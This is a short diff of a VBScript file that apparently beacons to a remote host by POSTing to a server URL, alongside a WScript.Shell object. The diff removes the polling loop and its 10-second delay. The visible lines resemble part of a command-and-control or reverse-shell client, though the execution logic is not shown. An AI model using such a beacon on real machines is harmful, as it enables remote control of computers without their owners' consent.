@@ -10,7 +10,6 @@ serverURL = "http://" & hostIP & ":" & port
 Set objShell = CreateObject("WScript.Shell")
 Set objHTTP = CreateObject("Microsoft.XMLHTTP")
 
-Do
     ' Send request to the server
     On Error Resume Next
     objHTTP.Open "POST", serverURL, False
@@ -29,8 +28,7 @@ Do
     End If
     
     ' Wait before the next check
-    WScript.Sleep 10000  ' 10-second delay
-Loop
+
 
 ' Clean up
 Set objShell = Nothing
